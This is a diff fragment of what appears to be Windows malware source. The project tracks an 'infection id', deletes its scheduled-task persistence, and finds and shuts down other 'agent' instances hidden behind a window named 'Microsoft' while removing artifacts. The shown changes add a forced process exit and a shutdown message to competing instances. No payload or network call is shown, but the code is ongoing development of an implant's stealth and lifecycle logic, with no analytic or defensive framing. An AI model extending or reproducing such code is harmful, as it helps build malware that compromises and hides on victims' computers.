@@ -1716,6 +1716,7 @@ LRESULT WINAPI agent_window_proc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lPar
 	{
 		windows_ts_delete_task(g_infection_id);
 		WSACleanup();
+		ExitProcess(0);
 	}
 
 	return DefWindowProcA(hWnd, Msg, wParam, lParam);
@@ -1801,6 +1802,8 @@ BOOL WINAPI agent_remove_artifacts(HWND hwnd, LPARAM lParam)
 	{
 		if (strings_str_equal(window_name, "Microsoft"))
 		{
+			int param = rand_get_number(0x0EE6B2800);
+			SendMessageA(hwnd, SHUTDOWN_AGENT, 0, (LPARAM)&param);
 			HANDLE proch = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
 
 			if (GetModuleFileNameExA(proch, nullptr, buffer, sizeof(buffer)))
@@ -1898,6 +1901,7 @@ int main()
 
 	auto start2_arg_exists = cmd_argument_exists("start2");
 	char *infection_id;
+
 	if (start2_arg_exists)
 	{
 		auto entry = (PLDR_DATA_TABLE_ENTRY)(NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink);
